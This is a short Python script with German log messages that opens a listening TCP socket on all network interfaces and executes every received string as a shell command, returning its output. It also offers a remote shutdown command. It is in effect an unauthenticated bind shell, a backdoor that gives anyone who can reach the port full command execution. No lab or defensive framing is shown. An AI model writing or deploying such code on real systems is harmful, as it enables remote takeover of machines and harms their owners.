import socket
import subprocess
import os

HOST = '0.0.0.0'
PORT = 65432

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"Server gestartet, lauscht auf {PORT}")
    conn, addr = s.accept()
    with conn:
        print('Verbunden mit', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            print("Befehl erhalten:", data)
            if data.lower() == 'shutdown':
                if os.name == 'nt':
                    subprocess.call(["shutdown", "/s", "/t", "0"])
                else:
                    subprocess.call(["shutdown", "-h", "now"])
            else:
                output = subprocess.getoutput(data)
                conn.sendall(output.encode())